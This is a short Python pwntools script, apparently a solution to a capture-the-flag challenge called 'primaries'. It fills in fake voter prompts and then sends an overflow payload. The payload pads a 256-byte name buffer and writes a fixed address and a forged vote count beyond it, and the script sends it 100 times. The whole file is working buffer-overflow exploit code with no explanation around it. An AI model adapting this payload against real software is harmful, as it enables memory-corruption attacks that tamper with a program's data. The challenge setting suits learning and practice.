from pwn import *

context(arch = 'i386', os = 'linux')

def cast_vote(payload, tube):
    tube.recvline_contains('Please enter your full name:')
    tube.sendline('Badger')
    tube.recvline_contains('Please enter your SSN:')
    tube.sendline('1337')
    tube.recvline_contains('Please enter your date of birth:')
    tube.sendline('1234')
    tube.recvline_contains('Please enter the candidate you are voting for:')
    tube.sendline('4')
    tube.recvline_contains('Who do you want to vote for?')

with context.local(log_level='debug'):
    tube = process('./primaries')
    #tube = remote('primaries.pwn.republican', 1901)

    winner = 'Elon Musk'
    votes = 0x11223344

    payload = winner + ((256 - len(winner)) * '\0')
    payload += p32(0x8048e24)
    payload += p32(votes)
    payload += '\n'

    for i in range(100):
        cast_vote(winner, tube)
        tube.send(payload)

    result = tube.recvall()
    print result
